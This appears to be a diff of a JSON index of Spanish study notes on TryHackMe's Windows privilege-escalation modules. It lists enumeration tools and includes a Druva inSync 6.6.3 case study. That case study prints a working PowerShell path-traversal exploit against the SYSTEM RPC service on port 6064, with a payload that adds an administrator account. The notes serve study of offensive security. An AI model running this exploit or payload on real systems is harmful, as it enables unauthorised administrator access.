-    "modified": "2025-11-22T00:47:14"
+    "content": "Existen muchos scripts que realizan enumeración del sistema de manera similar a los que hemos visto en tareas anteriores. Estas herramientas pueden acortar el proceso de enumeración y revelar diferentes vectores potenciales de escalada de privilegios. Aunque debes recordar que puede perderse algunos.\n\nDebajo hay algunas de las herramientas más comúnmente utilizadas.\n\n----------------------------\n<h2>WinPEAS</h2>\nEs un script desarrollado para enumerar el sistema objetivo para descubrir vectores de escalada de privilegios. Puedes encontrar WinPEAS [aquí](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS). Es buena idea redirigir el output a un archivo debido a su voluminosidad.\n\n----------------------------\n<h2>PrivescCheck</h2>\nEs un script de PowerShell que busca vectores de escalada de privilegios en el sistema objetivo. Ofrece una alternativa a WinPEAS sin requerir la ejecución de un binario. Puedes encontrarlo [aquí](https://github.com/itm4n/PrivescCheck). \n\n>[!NOTE] Puede que para poder ejecutarlo necesites sobrepasar las políticas de ejecución, usa `Set-ExecutionPolicy`.\n\n```powershell\nPS C:\\> Set-ExecutionPolicy Bypass -Scope process -Force\nPS C:\\> . .\\PrivescCheck.ps1\nPS C:\\> Invoke-PrivescCheck\n```\n\n---------------------------------\n<h2>WES-NG: Windows Exploit Suggester - Next Generation</h2>\nAlgunos scripts de sugerencia de exploits requerirán que los subas al sistema objetivo y los ejecutes. Esto puede hacer que software antivirus lo detecte y elimine. Para evitar hacer ruido innecesario que pueda atraer atención, puede que prefieras usar WES-NG, que correrá en tu máquina.\n\nWES-NG es un script de Python que puedes encontrar [aquí](https://github.com/bitsadmin/wesng).\n\nUna vez instalado, y antes de usarlo, escribe `wes.py --update` para actualizar la base de datos. El script se referirá a la base de datos que crea para comprobar parches faltantes que puedan resultar en vulnerabilidades en el sistema.\n\nPara usar el script debes ejecutar el comando `systeminfo` en el equipo objetivo. No olvides redirigirlo a un archivo. Una vez hecho esto, puedes ejecutar lo siguiente:\n\n```bash\nuser@kali$ wes.py systeminfo.txt\n```\n\n------------------------------------------\n<h2>Metasploit</h2>\nSi ya tienes una shell Meterpreter en el sistema objetivo, puedes usar el módulo `multi/recon/local_exploit_suggester` para listar vulnerabilidades que pueden afectar al sistema dado.",
+    "modified": "2025-12-02T00:51:52"
   },
   {
     "title": "4. Abusing Service Misconfigurations",
@@ -6140,8 +6276,8 @@
     "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/3-windows-privilege-escalation/6-abusing-vulnerable-software/",
     "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/3. Windows Privilege Escalation/6. Abusing Vulnerable Software.md",
     "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 3. Windows Privilege Escalation",
-    "content": "",
-    "modified": "2025-11-22T00:47:14"
+    "content": "<h2>Unpatched Software</h2>\nEl software instalado en el sistema objetivo, puede presentar varios tipos de oportunidades de escalada de privilegios. Con los drivers, puede que los usuarios y organizaciones no los actualicen tan recurrentemente como el sistema operativo. Puedes usar la herramienta `wmic` para listar el software instalado en el sistema objetivo y sus versiones. El comando de abajo dumpeará información que recolecte del software instalado.\n\n`wmic product get name,version,vendor`\n\n>[!CAUTION] Puede que `wmic product` no liste todos los programas instalados. Dependiendo de su método de instalación algunos pueden no aparecer.\n\nUna vez recopilada la información, siempre podemos buscar exploits existentes en el software instalado en sitios como [exploit-db](https://www.exploit-db.com/), [packet storm](https://packetstormsecurity.com/) o Google entre otros.\n\n-------------------------------------------\n<h2>Caso de Estudio: Druva inSync 6.6.3</h2>\n El servidor objetivo corre Druva inSync 6.6.3, que es vulnerable a la escalada de privilegios reportada por [Matteo Malvica](https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/). La vulnerabilidad resulta de un parche mal aplicado sobre otra vulnerabilidad reportada para la versión 6.5.0 por [Chris Lyne](https://www.tenable.com/security/research/tra-2020-12).\n\nEl software es vulnerable porque corre un servidor RPC (Remote Procedure Call) en el puerto 6064 con privilegios SYSTEM, accesible solo desde localhost.\n\n>[!NOTE] RPC es un mecanismo que permite a un proceso dado exponer funciones (llamados procedimientos) a la red para que otras máquinas puedan llamarlas remotamente.\n\nEn el caso de Druva, uno de estos procedimientos (el número 5), en el puerto 6064 permite a cualquiera pedir la ejecución de cualquier comando. Como corre con privilegios SYSTEM, dicho comando se ejecuta con esos privilegios.\n\nLa vulnerabilidad original (en la 6.5.0) permitía ejecutar cualquier comando sin restricciones. La idea de esto era permitir ejecutar ciertos binarios de forma remota, más que permitir la ejecución de cualquier comando.\n\nSalió un parche donde decidieron que la mejor manera de solventarlo era comprobar que el comando comenzaba con `C:\\ProgramData\\Druva\\inSync4\\`, donde se suponía que estaban los binarios autorizados. Para sobrepasar este control pobre, vale con realizar un Path Traversal: `C:\\ProgramData\\Druva\\inSync4\\..\\..\\..\\Windows\\System32\\cmd.exe`.\n\nPara entenderlo del todo, necesitamos saber cómo hablar con el puerto 6064. Por suerte el protocolo usado es sencillo.\n\n![[Pasted image 20251201183806.png]]\n\nPublicado por Matteo Malvica [aquí](https://packetstormsecurity.com/files/160404/Druva-inSync-Windows-Client-6.6.3-Privilege-Escalation.html), el siguiente exploit puede usarse en la máquina objetivo para elevar privilegios.\n\n```powershell\n$ErrorActionPreference = \"Stop\"\n\n$cmd = \"net user pwnd /add\"\n\n$s = New-Object System.Net.Sockets.Socket(\n    [System.Net.Sockets.AddressFamily]::InterNetwork,\n    [System.Net.Sockets.SocketType]::Stream,\n    [System.Net.Sockets.ProtocolType]::Tcp\n)\n$s.Connect(\"127.0.0.1\", 6064)\n\n$header = [System.Text.Encoding]::UTF8.GetBytes(\"inSync PHC RPCW[v0002]\")\n$rpcType = [System.Text.Encoding]::UTF8.GetBytes(\"$([char]0x0005)`0`0`0\")\n$command = [System.Text.Encoding]::Unicode.GetBytes(\"C:\\ProgramData\\Druva\\inSync4\\..\\..\\..\\Windows\\System32\\cmd.exe /c $cmd\");\n$length = [System.BitConverter]::GetBytes($command.Length);\n\n$s.Send($header)\n$s.Send($rpcType)\n$s.Send($length)\n$s.Send($command)\n```\n\n\n>[!IMPORTANT] Cambia la variable `cmd` por lo que quieras ejecutar.\n\nPara esta tarea cambiaremos el comando para usar: `net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add`\n\nEsto creará un usuario `pwnd` con la contraseña `SimplePass123` y lo añadirá al grupo de administradores.",
+    "modified": "2025-12-02T00:51:52"
   },
   {
     "title": "2. Harvesting Passwords from Usual Spots",
@@ -6950,5 +7086,125 @@
     "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 1. Introduction to Cyber Security > 1. Offensive Security Intro",
     "content": "Para ver este curso ve a **THM -> 0. Pre Career -> 1. Pre Security -> 1. Introduction to cybersecurity -> 1. Offensive Security Intro**",
     "modified": "2025-11-22T00:47:14"
+  },
+  {
+    "title": "1. Authentication",
+    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/1-authentication/",
+    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/1. Authentication.md",
+    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication",
+    "content": "1. [[0. Enumeration & Brute Force]]\n2. [[0. Session Management]]\n3.",
+    "modified": "2025-12-02T00:51:52"
+  },
+  {
+    "title": "4. Exploiting Vulnerable Password Reset Logic",
+    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/1-enumeration-brute-force/4-exploiting-vulnerable-password-reset-logic/",
+    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/1. Enumeration & Brute Force/4. Exploiting Vulnerable Password Reset Logic.md",
+    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 1. Enumeration & Brute Force",
+    "content": "",
+    "modified": "2025-12-02T00:51:52"
+  },
+  {
+    "title": "2. Authentication Enumeration",
+    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/1-enumeration-brute-force/2-authentication-enumeration/",
+    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/1. Enumeration & Brute Force/2. Authentication Enumeration.md",
+    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 1. Enumeration & Brute Force",
+    "content": "",
+    "modified": "2025-12-02T00:51:52"
+  },
+  {
+    "title": "0. Enumeration & Brute Force",
+    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/1-enumeration-brute-force/0-enumeration-brute-force/",
+    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/1. Enumeration & Brute Force/0. Enumeration & Brute Force.md",
+    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 1. Enumeration & Brute Force",
+    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/1. Enumeration & Brute Force/1. Introduction]]\n[[2. Authentication Enumeration]]\n[[3. Enumerating Users via Verbose Errors]]\n[[4. Exploiting Vulnerable Password Reset Logic]]\n[[5. Exploiting HTTP Basic Authentication]]\n[[6. OSINT]]",
+    "modified": "2025-12-02T00:51:52"
+  },
+  {
+    "title": "3. Enumerating Users via Verbose Errors",
+    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/1-enumeration-brute-force/3-enumerating-users-via-verbose-errors/",
+    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/1. Enumeration & Brute Force/3. Enumerating Users via Verbose Errors.md",
+    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 1. Enumeration & Brute Force",
+    "content": "",
+    "modified": "2025-12-02T00:51:52"
+  },
+  {
+    "title": "5. Exploiting HTTP Basic Authentication",
+    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/1-enumeration-brute-force/5-exploiting-http-basic-authentication/",
+    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/1. Enumeration & Brute Force/5. Exploiting HTTP Basic Authentication.md",
+    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 1. Enumeration & Brute Force",
+    "content": "",
+    "modified": "2025-12-02T00:51:52"
+  },
+  {
+    "title": "6. OSINT",
+    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/1-enumeration-brute-force/6-osint/",
+    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/1. Enumeration & Brute Force/6. OSINT.md",
+    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 1. Enumeration & Brute Force",
+    "content": "",
+    "modified": "2025-12-02T00:51:52"
+  },
+  {
+    "title": "1. Introduction",
+    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/1-enumeration-brute-force/1-introduction/",
+    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/1. Enumeration & Brute Force/1. Introduction.md",
+    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 1. Enumeration & Brute Force",
+    "content": "",
+    "modified": "2025-12-02T00:51:52"
+  },
+  {
+    "title": "3. Authentication vs Authorisation",
+    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/2-session-management/3-authentication-vs-authorisation/",
+    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/2. Session Management/3. Authentication vs Authorisation.md",
+    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 2. Session Management",
+    "content": "",
+    "modified": "2025-12-02T00:51:52"
+  },
+  {
+    "title": "4. Cookies vs Tokens",
+    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/2-session-management/4-cookies-vs-tokens/",
+    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/2. Session Management/4. Cookies vs Tokens.md",
+    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 2. Session Management",
+    "content": "",
+    "modified": "2025-12-02T00:51:52"
+  },
+  {
+    "title": "0. Session Management",
+    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/2-session-management/0-session-management/",
+    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/2. Session Management/0. Session Management.md",
+    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 2. Session Management",
+    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/2. Session Management/1. Introduction]]\n[[2. What is Session Management]]\n[[3. Authentication vs Authorisation]]\n[[4. Cookies vs Tokens]]\n[[5. Securing the Session Lifecycle]]\n[[6. Exploiting Insecure Session Management]]",
+    "modified": "2025-12-02T00:51:52"
+  },
+  {
+    "title": "2. What is Session Management",
+    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/2-session-management/2-what-is-session-management/",
+    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/2. Session Management/2. What is Session Management.md",
+    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 2. Session Management",
+    "content": "",
+    "modified": "2025-12-02T00:51:52"
+  },
+  {
+    "title": "5. Securing the Session Lifecycle",
+    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/2-session-management/5-securing-the-session-lifecycle/",
+    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/2. Session Management/5. Securing the Session Lifecycle.md",
+    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 2. Session Management",
+    "content": "",
+    "modified": "2025-12-02T00:51:52"
+  },
+  {
+    "title": "6. Exploiting Insecure Session Management",
+    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/2-session-management/6-exploiting-insecure-session-management/",
+    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/2. Session Management/6. Exploiting Insecure Session Management.md",
+    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 2. Session Management",
+    "content": "",
+    "modified": "2025-12-02T00:51:52"
+  },
+  {
+    "title": "1. Introduction",
+    "path": "/apuntes/ciberseguridad/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/2-session-management/1-introduction/",
+    "src": "content/Ciberseguridad/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/2. Session Management/1. Introduction.md",
+    "breadcrumb": "Ciberseguridad > THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 2. Session Management",
+    "content": "",
+    "modified": "2025-12-02T00:51:52"
   }
 ]
